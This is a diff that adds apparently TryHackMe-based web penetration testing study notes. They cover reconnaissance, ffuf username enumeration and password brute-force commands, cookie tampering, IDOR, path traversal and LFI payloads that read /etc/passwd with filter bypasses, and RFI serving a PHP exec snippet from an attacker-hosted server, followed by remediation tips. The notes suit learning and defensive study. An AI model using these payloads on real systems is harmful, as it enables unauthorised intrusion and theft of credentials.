@@ -1,0 +1,510 @@
+= Process
+
+== Walking the application
+
+=== Manually, simple browsing
+Manually explore the target website with the browser's tools and take notes of the structure.
+
+Example with a test website:
+
+|===
+|Feature |URL |Summary
+
+|Home Page
+|URL
+|This page contains a summary of what Acme IT Support does with a company photo of their staff.
+
+|Latest News
+|/news
+|This page contains a list of recently published news articles by the company, and each news article has a link with an id number, i.e. /news/article?id=1
+
+|ews Article
+|/news/article?id=1
+|Displays the individual news article. Some articles seem to be blocked and reserved for premium customers only.
+
+|Contact Page
+|/contact
+|This page contains a form for customers to contact the company. It contains name, email and message input fields and a send button.
+
+|Customers
+|/customers
+|This link redirects to /customers/login.
+
+|Customer Login
+|/customers/login
+|This page contains a login form with username and password fields.
+
+|Customer Signup
+|/customers/signup
+|This page contains a user-signup form that consists of a username, email, password and password confirmation input fields.
+
+|Customer Reset Password
+|/customers/reset
+|Password reset form with an email address input field.
+
+|Customer Dashboard
+|/customers
+|This page contains a list of the user's tickets submitted to the IT support company and a "Create Ticket" button.
+
+|Create Ticket
+|/customers/ticket/new
+|This page contains a form with a textbox for entering the IT issue and a file upload option to create an IT support ticket.
+
+|Customer Account
+|/customers/account
+|This page allows the user to edit their username, email and password.
+
+|Customer Logout
+|/customers/logout
+|This link logs the user out of the customer area.
+|===
+
+=== View the page source
+* check HTML comments for information
+* check external files if they are stored in the same directory, with directory listing feature enabled, we could get access to extra files
+* check for clues on the framework used to build the website. Is it up-to-date?
+
+=== Developer tools
+
+==== Inspector
+The page source doesn't always represent what's shown on a webpage; this is because CSS, JavaScript and user interaction can change the content and style of the page, which means we need a way to view what's been displayed in the browser window at this exact time. Element inspector assists us with this by providing us with a live representation of what is currently on the website.
+
+We can check CSS and remove paywall (display: block -> display: none)
+
+==== Debugger
+Debug page JavaScript using breakpoints, edit JavaScript
+
+==== Network
+The network tab on the developer tools can be used to keep track of every external request a webpage makes. If we click on the Network tab and then refresh the page, we'll see all the files the page is requesting.
+
+AJAX is a method for sending and receiving network data in a web application background without interfering by changing the current web page.
+
+== Content discovery
+Content can be many things, a file, video, picture, backup, a website feature. We try to find content that weren't always intended for public access.
+
+This content could be, for example, pages or portals intended for staff usage, older versions of the website, backup files, configuration files, administration panels, etc.
+
+Three main ways: manually, automated and OSINT (Open-Source Intelligence).
+
+=== Manual
+==== Robots.txt
+Document that tells search engines which pages they are and aren't allowed to show on their search engine results (admin page, files for customers, ...) or ban specific search engines from crawling the website altogether.
+
+==== Favicon
+Small icon displayed in the browser's address bar or tab used for branding a website. Sometimes, the framework's favicon isn't replace by a custom one so this gives us clues.
+
+Check OWASP favicon DB using md5sum of the favicon: https://wiki.owasp.org/index.php/OWASP_favicon_database
+
+[source,shell]
+----
+curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
+----
+
+==== Sitemap.xml
+The sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.
+
+==== HTTP headers
+Check webserver software, programming/scripting language in use
+
+==== Framework stack
+Find framework stack using favicon, page source (comments, copyright notices, credits, ...).
+
+Look for default credentials, default admin page, ...
+
+=== OSINT
+Find info on the target using freely available tools (search engine, ...)
+
+==== Google hacking/dorking
+https://en.wikipedia.org/wiki/Google_hacking
+
+|===
+|Filter |Example |Description
+
+|site
+|site:tryhackme.com
+|returns results only from the specified website address
+
+|inurl
+|inurl:admin
+|returns results that have the specified word in the URL
+
+|filetype
+|filetype:pdf
+|returns results which are a particular file extension
+
+|intitle
+|intitle:admin
+|returns results that contain the specified word in the title
+
+|===
+
+==== Wappalyzer
+Online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.
+
+https://www.wappalyzer.com/
+
+
+==== Wayback Machine
+Historical archive of websites that dates back to the late 90s. We can search a domain name, and it will show us all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.
+
+https://archive.org/web/
+
+==== GitHub
+Use GitHub search feature to look for company names or website names. Check source code for passwords or other content.
+
+==== S3 Buckets
+Check public S3 buckets of the company.
+
+S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as \{name\}-assets, \{name\}-www, \{name\}-public, \{name\}-private, etc.
+
+=== Automated discovery
+Automated requests that check whether a file or directory exists on a website, giving us access to resources we didn't previously know existed. This process is made possible by using a resource called wordlists.
+
+For website: https://github.com/danielmiessler/SecLists
+
+For passwords: Rockyou, ...
+
+==== Tools
+Plenty of tools available: ffuf, dirb, gobuster, ...
+
+[source, bash]
+----
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.173.61/FUZZ
+
+dirb http://10.10.173.61/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+gobuster dir --url http://10.10.173.61/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+----
+
+== Subdomain enumeration
+Find valid subdomains for a domain to expand our attack surface to try and discover more potential points of vulnerability.
+
+=== Brute force
+Bruteforce DNS enumeration is the method of trying millions of different possible subdomains from a pre-defined list of commonly used subdomains.
+
+Tool: dnsrecon
+
+=== OSINT
+
+==== SSL/TLS certificates
+When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used.
+
+Can use sites to discover subdomains :
+
+* https://crt.sh/
+* https://transparencyreport.google.com/https/certificates
+
+==== Search engines
+Use google filters to find subdomains -> -site:www.tryhackme.com  site:*.tryhackme.com
+
+==== Sublist3r
+Automated tool (python script) used to bruteforce DNS using search engines and other tools.
+
+=== Virtual hosts
+Some subdomains aren't always hosted in publicly accessible DNS results but can be found in hosts file. We can update the Host header and check the response to see if we've discovered a new website.
+
+The following command outputs lots of results. For invalid request, we always get the same error so we can filter out those errors using -fs and the size of the response.
+
+[source,shell]
+----
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.74.156 -fs {size}
+----
+
+== Authentication bypass
+
+=== Username enumeration
+Create a list of valid usernames using error messages to get information (An account with this username already exists).
+
+Use ffuf tool that uses a list of commonly used usernames to check against for any matches.
+
+[source,shell]
+----
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.247.130/customers/signup -mr "username already exists"
+----
+
+Save valid usernames in a file for later.
+
+=== Brute force
+Using existing valid usernames from enumeration, we can try brute forcing their password.
+
+[source, shell]
+----
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.247.130/customers/login -fc 200
+----
+
+=== Logic flaw
+Bypass a typical logical path of an application.
+
+* bad regex or string comparison
+* input sent in query parameter and post data. POST data can overwrite the query parameter if the key is the same so if the website first check the query param and continue with the POST data, we can overwrite that
+
+[source,php]
+----
+if( url.substr(0,6) === '/admin') {
+    # Code to check user is an admin
+} else {
+    # View Page
+}
+----
+
+Because the above PHP code example uses three equals signs (===), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting /adMin will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.
+
+=== Cookie tampering
+Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.
+
+==== Plain text
+Just update the cookie to change the behaviour of the application
+
+[source, shell]
+----
+curl -H "Cookie: logged_in=true; admin=false" http://10.10.247.130/cookie-test
+
+
+user@tryhackme$ curl -H "Cookie: logged_in=true; admin=true" http://10.10.247.130/cookie-test
+----
+
+==== Hashing
+Even though a hash is irreversible, the same output is produced every time for the same input which is helpful for service such as https://crackstation.net/ which keep database of billions of hashes and their original strings.
+
+|===
+|Original String |Hash Method |Output
+
+|1
+|md5
+|c4ca4238a0b923820dcc509a6f75849b
+
+|1
+|sha-256
+|6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
+
+|1
+|sha-512
+|4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a
+
+|1
+|sha1
+|356a192b7913b04c54574d18c28d46e6395428ab
+
+|===
+
+==== Encoding
+Encoding is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is reversible. Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.
+
+Common encodings: base32 (A-Z, 2-7) and base64 (a-z, A-Z, 0-9, +, /, = for padding).
+
+== Insecure Direct Object Reference (IDOR)
+If we have an URL such as http://online-service.thm/profile?user_id=1305 and we try another ID param and get the information of the other user.
+
+We can find IDOR in:
+
+* encoded ID, usually base64 (a-zA-Z0-9=)
+* hashed ID like an ID number 123 which would be hashed using md5sum, check https://crackstation.net for any match
+* unpredictable IDs can be tested by creating two accounts and swap ID to see if we get the other's infos
+
+The vulnerable endpoint may not always be something we see in the address bar. It could be content our browser loads in via an AJAX request or a reference in a JavaScript file.
+
+*Parameter mining* can be used to discover parameter such as user_id for /user/details endpoint.
+
+== File upload
+1. Take a look at the website as a whole (wappalyzer extension or by hand), find indicators on languages and frameworks. Check headers (server, x-powered-by), look for upload page
+2. look at the source code of upload page, look for client side scripts for filters
+3. upload valid file, check the result. Can we directly access it? Is it embedded in the page somewhere? What's the naming scheme -> use Gobuster (use -x switch to find our file)
+4. upload malicious file, bypass client-side filters, check server-side filters
+
+If we can successfully upload a file with a totally invalid file extension -> blacklist most likely; if it fails -> whitelist
+
+Reupload valid file with updated magic number to check if the server uses magic number based filtering
+
+Reupload valid file, intercept request with Burpsuite and change IMI type of the upload to something that we would expect to be filtered. If upload fails -> server is filtering based on MIME types.
+
+Enumerate file length filters -> upload progressively bigger files until we hit the filter
+
+== File inclusion
+Happens when some files from the file system should be returned (images, static text, ...) via parameters.
+
+http://webapp.thm/get.php?file=userCV.pdf
+
+Several types:
+
+* local file inclusion (LFI)
+* remote file inclusion (RFI)
+* directory traversal
+
+If we can write to the server in directories such as /tmp, we could gain remote command execution (RCE).
+
+For file inclusion to be worth it, we need access to sensitive data or writing ability on the server.
+
+=== Path traversal / Directory traversal / dot-dot-slash attack
+Read operating system resources (local files) from outside the application's root directory using URL.
+
+This vulnerability occurs when the user's input is passed to a function such as file_get_contents in PHP and poor validation.
+
+* Linux: http://webapp.thm/get.php?file=../../../../etc/passwd
+* Windows XP/Server 2003/newer: http://webapp.thm/get.php?file=../../../../boot.ini
+* Windows (older version): http://webapp.thm/get.php?file=../../../../windows/win.ini
+
+Common OS files:
+
+|===
+|Location |Description
+
+|/etc/issue
+|contains a message or system identification to be printed before the login prompt.
+
+|/etc/profile
+|controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
+
+|/proc/version
+|specifies the version of the Linux kernel
+
+|/etc/passwd
+|has all registered user that has access to a system
+
+|/etc/shadow
+|contains information about the system's users' passwords
+
+|/root/.bash_history
+|contains the history commands for root user
+
+|/var/log/dmessage
+|contains global system messages, including the messages that are logged during system startup
+
+|/var/mail/root
+|all emails for root user
+
+|/root/.ssh/id_rsa
+|Private SSH keys for a root or any known valid user on the server
+
+|/var/log/apache2/access.log
+|the accessed requests for Apache webserver
+
+|C:\boot.ini
+|contains the boot options for computers with BIOS firmware
+
+|===
+
+=== LFI
+We need to pay attention to error logging returned when trying LFI. This may give us clues about path.
+
+PHP functions: include, require, include_once, require_once
+
+[source,php]
+----
+<?PHP
+	include($_GET["lang"]);
+?>
+----
+
+We can load AR.php or EN.php which are located in the same directory using this query
+
+[source,shell]
+----
+GET http://webapp.thm/index.php?lang=EN.php
+----
+
+We could try this for direct access
+
+[source,shell]
+----
+GET http://webapp.thm/index.php?lang=/etc/passwd
+----
+
+If there is a path, we need to use path traversal.
+
+[source,php]
+----
+<?PHP
+	include("languages/". $_GET['lang']);
+?>
+----
+
+[source,shell]
+----
+http://webapp.thm/index.php?lang=../../../../etc/passwd
+----
+
+==== Bypass
+===== Null byte
+If some information is appended to our input which makes the path traversal invalid, we can use the null byte (%00 or 0x00) to disregard what appears after the payload (fixed in PHP 5.3.4).
+
+Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
+
+in this example, .php was added.
+
+=> http://10.10.97.221/lab3.php?file=../../../../etc/passwd%00
+
+This can also be used if there is some restriction on file extension. For example, if there is a file that we want from an open FTP that ends with .json but we are only allowed to download .md and .pdf, we can query the file using ip/ftp/package.json%2500.md -> the request is valid and the server will ignore anything after the .json
+
+===== Current directory trick
+If there is some filtering, we can use the current directory trick at the end of the filtered keyword "/.".
+
+Example: http://webapp.thm/index.php?lang=/etc/passwd/.
+
+Because /etc/passwd/. = /etc/passwd
+
+===== Replacing of "../" by an empty string
+If ../../../../etc/passwd becomes /etc/passwd (check potential error message), we can use the following trick with PHP because the filter only matches and replaces the first subset string.
+
+....//....//....//....//....//etc/passwd
+
+because
+
+===== Webapp asks to supply input that has a include directory
+The code forces the include to read from a defined directory.
+
+http://webapp.thm/index.php?lang=languages/EN.php
+
+To exploit this, we need to include the directory in the payload like:
+
+?lang=languages/../../../../../etc/passwd
+
+else we get an error like "Access Denied! Allowed files at languages folder only" (custom error)
+
+===== Filtering of slash
+If the forward slash is filtered out from the input. It may be possible to use $_REQUEST for PHP website.
+
+$_REQUEST is a PHP super global variable which is used to collect data after submitting an HTML form. We need to specify the method in the data.
+
+[source,bash]
+----
+curl -v 10.10.87.141/challenges/chall3.php -X POST -d 'method=POST&file=../../../../etc/flag3%00' --output -
+----
+
+=== RFI
+Remote file inclusion is a technique to include remote files into a vulnerable application -> inject external URL into include function.
+
+One requirement for RFI is that the allow_url_fopen option needs to be "on".
+
+Bigger risk than LFI because an attacker can gain Remote Command Execution (RCE) on the server. Other consequences: sensitive information disclosure, XSS, DoS.
+
+An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.
+
+==== Execute PHP code on the server
+Create file (cmd.txt) with some PHP code
+
+[source, php]
+----
+<? PHP print exec('hostname'); ?>
+----
+
+Start a server with Python where the file is located
+
+[source, bash]
+----
+python3 -m http.server 4444
+----
+
+Inject the URL to the file http://10.10.26.138:4444/cmd.txt
+
+The PHP code is executed on the (unprotected) server and gives us back the hostname.
+
+==== Remediation
+
+. keep everything updated with the latest version
+. turn off PHP errors to avoid leaking path of the app and other info
+. use Web Application Firewall
+. disable some PHP features like allow_url_fopen and allow_url_include
+. carefully analyze web app and allow only protocols and PHP wrappers that are in need
+. never trust user input, implement proper validation against file inclusion
+. implement whitelisting for file names and locations as well as blacklisting
+
